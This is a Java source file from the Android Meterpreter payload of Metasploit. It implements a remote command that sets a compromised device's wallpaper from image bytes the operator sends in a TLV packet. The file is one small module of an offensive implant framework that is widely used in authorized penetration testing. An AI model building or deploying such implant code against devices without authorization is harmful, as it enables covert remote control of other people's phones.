package com.metasploit.meterpreter.android;

import android.app.WallpaperManager;
import android.content.Context;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import java.io.ByteArrayInputStream;


public class android_set_wallpaper implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_WALLPAPER_DATA = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 9201);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        final Context context = AndroidMeterpreter.getContext();
        if (context == null) {
            return ERROR_FAILURE;
        }
        WallpaperManager wallpaperManager = WallpaperManager.getInstance(context);
        byte[] wallpaper = request.getRawValue(TLV_TYPE_WALLPAPER_DATA);
        wallpaperManager.setStream(new ByteArrayInputStream(wallpaper));
        return ERROR_SUCCESS;
    }
}
